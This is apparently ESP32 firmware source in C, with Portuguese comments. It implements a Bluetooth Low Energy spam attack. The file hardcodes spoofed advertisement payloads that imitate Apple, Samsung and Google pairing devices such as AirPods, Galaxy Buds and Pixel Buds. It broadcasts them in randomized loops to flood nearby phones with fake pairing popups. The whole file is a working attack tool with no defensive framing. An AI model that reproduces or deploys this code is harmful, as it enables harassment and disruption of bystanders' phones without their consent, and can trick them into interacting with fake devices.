#include "hacking_ble.h"
#include "transport_ble.h"
#include "tlv.h"

#include <stdlib.h>
#include <string.h>

#include "esp_log.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "host/ble_hs.h"
#include "host/ble_gap.h"

static const char *TAG = "hack-ble";

// ----------------------------------------------------------------------
// Apple Continuity Proximity Pairing (subtype 0x07)
// ----------------------------------------------------------------------
#define APPLE_PAYLOAD_LEN 29
#define APPLE_NUM_MODELS  5

static const uint8_t apple_payloads[APPLE_NUM_MODELS][APPLE_PAYLOAD_LEN] = {
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x02,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x0E,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x0A,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x06,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x10,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
};

// ----------------------------------------------------------------------
// Samsung EasySetup (Manufacturer Data Company ID 0x0075)
// Formato: [75 00] [01 00 02 00] [model_id_3B] [01]
// Causa popup de "Galaxy Buds detectados" / "smart device near".
// ----------------------------------------------------------------------
#define SAMSUNG_PAYLOAD_LEN 11
#define SAMSUNG_NUM_MODELS  5

static const uint8_t samsung_payloads[SAMSUNG_NUM_MODELS][SAMSUNG_PAYLOAD_LEN] = {
    {0x75,0x00, 0x01,0x00, 0x02,0x00, 0xA9,0x01,0x55, 0x01, 0x42}, // Galaxy Buds Live
    {0x75,0x00, 0x01,0x00, 0x02,0x00, 0xCD,0x01,0x55, 0x01, 0x42}, // Galaxy Buds Pro
    {0x75,0x00, 0x01,0x00, 0x02,0x00, 0xA0,0x01,0x55, 0x01, 0x42}, // Galaxy Buds 2
    {0x75,0x00, 0x01,0x00, 0x02,0x00, 0xC1,0x01,0x55, 0x01, 0x42}, // Galaxy Buds 2 Pro
    {0x75,0x00, 0x01,0x00, 0x02,0x00, 0xC4,0x01,0x55, 0x01, 0x42}, // Galaxy Watch6
};

// ----------------------------------------------------------------------
// Google Fast Pair (Service Data UUID 0xFE2C)
// Formato: [2C FE] [model_id_3B] [random_3B]
// Service Data IE: tag 0x16 + svc_uuid_2B + payload.
// Gera popup "Pixel Buds detected" em Android com Fast Pair on.
// ----------------------------------------------------------------------
#define GOOGLE_PAYLOAD_LEN 8 // 2 svc_uuid + 3 model + 3 random
#define GOOGLE_NUM_MODELS  5

static const uint8_t google_models[GOOGLE_NUM_MODELS][3] = {
    {0xCD,0x82,0x56}, // Pixel Buds A-Series
    {0xD4,0x60,0xCB}, // Pixel Buds Pro
    {0x00,0x00,0x9C}, // generic Fast Pair
    {0x47,0x09,0x65}, // Pixel Buds 2
    {0x4F,0x65,0x9F}, // Bose QC35 II Fast Pair model
};

// ----------------------------------------------------------------------
// Estado compartilhado
// ----------------------------------------------------------------------
static volatile bool s_busy = false;
static TaskHandle_t s_task = NULL;
static uint8_t s_seq = 0;

bool hacking_ble_busy(void)
{
    return s_busy;
}

esp_err_t hacking_ble_init(void)
{
    ESP_LOGI(TAG, "ready (apple=%d, samsung=%d, google=%d)",
             APPLE_NUM_MODELS, SAMSUNG_NUM_MODELS, GOOGLE_NUM_MODELS);
    return ESP_OK;
}

static int spam_event_cb(struct ble_gap_event *event, void *arg)
{
    (void)event; (void)arg;
    return 0;
}

static void emit_spam_done(uint16_t sent, uint16_t requested,
                            ble_spam_vendor_t vendor)
{
    uint8_t payload[5];
    payload[0] = (uint8_t)(sent >> 8);
    payload[1] = (uint8_t)(sent & 0xFF);
    payload[2] = (uint8_t)(requested >> 8);
    payload[3] = (uint8_t)(requested & 0xFF);
    payload[4] = (uint8_t)vendor;

    uint8_t frame[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(frame, sizeof(frame),
                           TLV_MSG_HACK_BLE_SPAM_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(frame, (size_t)total);
}

// Faz uma rodada de spam com mfg_data ou service_data; retorna 1 se OK.
static int spam_one_cycle_mfg(const uint8_t *mfg, size_t mfg_len)
{
    ble_gap_adv_stop();

    struct ble_hs_adv_fields fields = {0};
    fields.mfg_data = mfg;
    fields.mfg_data_len = (uint8_t)mfg_len;

    int rc = ble_gap_adv_set_fields(&fields);
    if (rc != 0) {
        ESP_LOGW(TAG, "set_fields rc=%d", rc);
        return 0;
    }

    struct ble_gap_adv_params params = {0};
    params.conn_mode = BLE_GAP_CONN_MODE_NON;
    params.disc_mode = BLE_GAP_DISC_MODE_NON;
    params.itvl_min = 0x20;
    params.itvl_max = 0x30;

    rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER,
                           &params, spam_event_cb, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "adv_start rc=%d", rc);
        return 0;
    }
    return 1;
}

// Spam com Service Data (Google Fast Pair). NimBLE não tem campo direto
// pra svc_data 16-bit em ble_hs_adv_fields, então montamos o adv data raw.
static int spam_one_cycle_svc_data(const uint8_t *body, size_t body_len)
{
    ble_gap_adv_stop();

    // Adv packet: [flags 0x02 0x01 0x06] [svc_data: 1+1+body_len]
    // svc_data IE: length(1) | type(0x16) | uuid_2B + body
    // Mas como já está no body_len os 2 bytes da uuid, é:
    //   [body_len+1] [0x16] [body...]
    uint8_t raw[31];
    size_t off = 0;
    raw[off++] = 2; raw[off++] = 0x01; raw[off++] = 0x06; // flags
    raw[off++] = (uint8_t)(body_len + 1); // length of next IE
    raw[off++] = 0x16; // type = Service Data 16-bit
    if (off + body_len > sizeof(raw)) return 0;
    memcpy(&raw[off], body, body_len);
    off += body_len;

    int rc = ble_gap_adv_set_data(raw, off);
    if (rc != 0) {
        ESP_LOGW(TAG, "adv_set_data rc=%d", rc);
        return 0;
    }

    struct ble_gap_adv_params params = {0};
    params.conn_mode = BLE_GAP_CONN_MODE_NON;
    params.disc_mode = BLE_GAP_DISC_MODE_NON;
    params.itvl_min = 0x20;
    params.itvl_max = 0x30;

    rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER,
                           &params, spam_event_cb, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "adv_start rc=%d", rc);
        return 0;
    }
    return 1;
}

// ----------------------------------------------------------------------
// Tasks por vendor
// ----------------------------------------------------------------------

typedef struct {
    uint16_t cycles;
    ble_spam_vendor_t vendor;
} spam_job_t;

static void run_apple_cycle(uint16_t *sent)
{
    uint32_t r = esp_random();
    size_t pidx = r % APPLE_NUM_MODELS;
    *sent += spam_one_cycle_mfg(apple_payloads[pidx], APPLE_PAYLOAD_LEN);
}

static void run_samsung_cycle(uint16_t *sent)
{
    uint32_t r = esp_random();
    size_t pidx = r % SAMSUNG_NUM_MODELS;
    *sent += spam_one_cycle_mfg(samsung_payloads[pidx], SAMSUNG_PAYLOAD_LEN);
}

static void run_google_cycle(uint16_t *sent)
{
    uint32_t r = esp_random();
    size_t pidx = r % GOOGLE_NUM_MODELS;
    uint8_t body[GOOGLE_PAYLOAD_LEN];
    body[0] = 0x2C; body[1] = 0xFE;             // service uuid LE
    memcpy(&body[2], google_models[pidx], 3);    // model id
    uint32_t rnd = esp_random();
    body[5] = (uint8_t)(rnd >> 16);
    body[6] = (uint8_t)(rnd >> 8);
    body[7] = (uint8_t)(rnd & 0xFF);
    *sent += spam_one_cycle_svc_data(body, sizeof(body));
}

static void spam_task(void *arg)
{
    spam_job_t *job = (spam_job_t *)arg;

    ble_gap_adv_stop();

    uint16_t sent = 0;
    for (uint16_t i = 0; i < job->cycles; i++) {
        ble_spam_vendor_t v = job->vendor;
        if (v == BLE_SPAM_VENDOR_MULTI) {
            uint32_t r = esp_random() % 3;
            v = (ble_spam_vendor_t)r;
        }
        switch (v) {
        case BLE_SPAM_VENDOR_APPLE:   run_apple_cycle(&sent);   break;
        case BLE_SPAM_VENDOR_SAMSUNG: run_samsung_cycle(&sent); break;
        case BLE_SPAM_VENDOR_GOOGLE:  run_google_cycle(&sent);  break;
        default: break;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    ble_gap_adv_stop();
    transport_ble_advertising_resume();

    ESP_LOGI(TAG, "ble spam done: %u/%u cycles (vendor=%u)",
             (unsigned)sent, (unsigned)job->cycles, (unsigned)job->vendor);

    emit_spam_done(sent, job->cycles, job->vendor);

    free(job);
    s_task = NULL;
    s_busy = false;
    vTaskDelete(NULL);
}

static esp_err_t spam_dispatch(uint16_t cycles, ble_spam_vendor_t vendor)
{
    if (s_busy) return ESP_ERR_INVALID_STATE;
    if (cycles == 0) cycles = 50;
    if (cycles > 500) cycles = 500;

    spam_job_t *job = calloc(1, sizeof(*job));
    if (!job) return ESP_ERR_NO_MEM;
    job->cycles = cycles;
    job->vendor = vendor;

    s_busy = true;
    if (xTaskCreate(spam_task, "ble_spam", 4096, job, 5, &s_task) != pdPASS) {
        free(job);
        s_busy = false;
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

esp_err_t hacking_ble_apple_spam(uint16_t cycles)
{
    return spam_dispatch(cycles, BLE_SPAM_VENDOR_APPLE);
}

esp_err_t hacking_ble_samsung_spam(uint16_t cycles)
{
    return spam_dispatch(cycles, BLE_SPAM_VENDOR_SAMSUNG);
}

esp_err_t hacking_ble_google_spam(uint16_t cycles)
{
    return spam_dispatch(cycles, BLE_SPAM_VENDOR_GOOGLE);
}

esp_err_t hacking_ble_multi_spam(uint16_t cycles)
{
    return spam_dispatch(cycles, BLE_SPAM_VENDOR_MULTI);
}
